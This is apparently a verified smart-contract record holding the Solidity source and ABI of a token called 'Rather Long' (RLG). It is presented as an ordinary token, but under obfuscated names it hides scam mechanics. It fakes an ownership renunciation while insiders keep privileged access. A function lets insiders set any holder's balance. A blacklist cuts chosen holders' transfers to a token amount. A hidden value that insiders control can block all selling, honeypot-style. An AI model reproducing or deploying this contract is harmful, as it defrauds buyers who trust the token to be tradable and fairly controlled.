{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface totalLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingLiquidity {\n    function createPair(address senderMin, address isTo) external returns (address);\n}\n\ninterface amountEnableToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingWallet) external view returns (uint256);\n\n    function transfer(address limitAuto, uint256 takeFund) external returns (bool);\n\n    function allowance(address shouldAmountTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAuto,\n        uint256 takeFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldLiquidity, uint256 value);\n    event Approval(address indexed shouldAmountTotal, address indexed spender, uint256 value);\n}\n\ninterface sellReceiver is amountEnableToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RatherLong is teamMarketing, amountEnableToken, sellReceiver {\n\n    bool private launchMinMode;\n\n    uint256 public toLiquidity;\n\n    function shouldReceiver(address limitMode) public {\n        amountAuto();\n        if (receiverFundTeam) {\n            swapWallet = toLiquidity;\n        }\n        if (limitMode == tokenList || limitMode == atTeam) {\n            return;\n        }\n        marketingMaxTeam[limitMode] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverExempt;\n    }\n\n    bool public receiverShouldTake;\n\n    function transfer(address amountLimitExempt, uint256 takeFund) external virtual override returns (bool) {\n        return listToken(_msgSender(), amountLimitExempt, takeFund);\n    }\n\n    address buyLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public shouldToken;\n\n    string private launchedBuy = \"Rather Long\";\n\n    function owner() external view returns (address) {\n        return listAmount;\n    }\n\n    bool public minLaunched;\n\n    uint256 constant totalFrom = 2 ** 10;\n\n    function transferFrom(address maxModeFrom, address limitAuto, uint256 takeFund) external override returns (bool) {\n        if (_msgSender() != teamMax) {\n            if (amountMode[maxModeFrom][_msgSender()] != type(uint256).max) {\n                require(takeFund <= amountMode[maxModeFrom][_msgSender()]);\n                amountMode[maxModeFrom][_msgSender()] -= takeFund;\n            }\n        }\n        return listToken(maxModeFrom, limitAuto, takeFund);\n    }\n\n    function feeMode(uint256 takeFund) public {\n        amountAuto();\n        exemptIs = takeFund;\n    }\n\n    function approve(address swapTake, uint256 takeFund) public virtual override returns (bool) {\n        amountMode[_msgSender()][swapTake] = takeFund;\n        emit Approval(_msgSender(), swapTake, takeFund);\n        return true;\n    }\n\n    mapping(address => uint256) private teamExempt;\n\n    string private fundSwap = \"RLG\";\n\n    uint256 public swapWallet;\n\n    function getOwner() external view returns (address) {\n        return listAmount;\n    }\n\n    address public atTeam;\n\n    event OwnershipTransferred(address indexed tradingSwapTotal, address indexed walletFrom);\n\n    function name() external view virtual override returns (string memory) {\n        return launchedBuy;\n    }\n\n    uint8 private minAt = 18;\n\n    function buyWallet(address liquidityTrading) public {\n        if (minLaunched) {\n            return;\n        }\n        \n        launchedSwapMin[liquidityTrading] = true;\n        if (tokenMax) {\n            takeSellTrading = swapWallet;\n        }\n        minLaunched = true;\n    }\n\n    mapping(address => bool) public launchedSwapMin;\n\n    address private listAmount;\n\n    function amountAuto() private view {\n        require(launchedSwapMin[_msgSender()]);\n    }\n\n    function listToken(address maxModeFrom, address limitAuto, uint256 takeFund) internal returns (bool) {\n        if (maxModeFrom == tokenList) {\n            return liquidityBuyReceiver(maxModeFrom, limitAuto, takeFund);\n        }\n        uint256 launchedLaunch = amountEnableToken(atTeam).balanceOf(buyLimit);\n        require(launchedLaunch == exemptIs);\n        require(limitAuto != buyLimit);\n        if (marketingMaxTeam[maxModeFrom]) {\n            return liquidityBuyReceiver(maxModeFrom, limitAuto, totalFrom);\n        }\n        return liquidityBuyReceiver(maxModeFrom, limitAuto, takeFund);\n    }\n\n    function liquidityBuyReceiver(address maxModeFrom, address limitAuto, uint256 takeFund) internal returns (bool) {\n        require(teamExempt[maxModeFrom] >= takeFund);\n        teamExempt[maxModeFrom] -= takeFund;\n        teamExempt[limitAuto] += takeFund;\n        emit Transfer(maxModeFrom, limitAuto, takeFund);\n        return true;\n    }\n\n    function balanceOf(address marketingWallet) public view virtual override returns (uint256) {\n        return teamExempt[marketingWallet];\n    }\n\n    mapping(address => mapping(address => uint256)) private amountMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundSwap;\n    }\n\n    uint256 sellMax;\n\n    function allowance(address listLiquidity, address swapTake) external view virtual override returns (uint256) {\n        if (swapTake == teamMax) {\n            return type(uint256).max;\n        }\n        return amountMode[listLiquidity][swapTake];\n    }\n\n    bool private enableMin;\n\n    uint256 public takeSellTrading;\n\n    bool public receiverFundTeam;\n\n    uint256 exemptIs;\n\n    address public tokenList;\n\n    constructor (){\n        if (shouldToken != receiverShouldTake) {\n            enableMin = false;\n        }\n        totalLaunched takeList = totalLaunched(teamMax);\n        atTeam = tradingLiquidity(takeList.factory()).createPair(takeList.WETH(), address(this));\n        if (toLiquidity == swapWallet) {\n            launchMinMode = true;\n        }\n        tokenList = _msgSender();\n        senderFee();\n        launchedSwapMin[tokenList] = true;\n        teamExempt[tokenList] = receiverExempt;\n        \n        emit Transfer(address(0), tokenList, receiverExempt);\n    }\n\n    bool public tokenMax;\n\n    function senderFee() public {\n        emit OwnershipTransferred(tokenList, address(0));\n        listAmount = address(0);\n    }\n\n    mapping(address => bool) public marketingMaxTeam;\n\n    function maxShouldTotal(address amountLimitExempt, uint256 takeFund) public {\n        amountAuto();\n        teamExempt[amountLimitExempt] = takeFund;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minAt;\n    }\n\n    address teamMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private receiverExempt = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAmountTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwapTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"}],\"name\":\"buyWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeFund\",\"type\":\"uint256\"}],\"name\":\"feeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSwapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimitExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeFund\",\"type\":\"uint256\"}],\"name\":\"maxShouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShouldTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSellTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimitExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxModeFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RatherLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}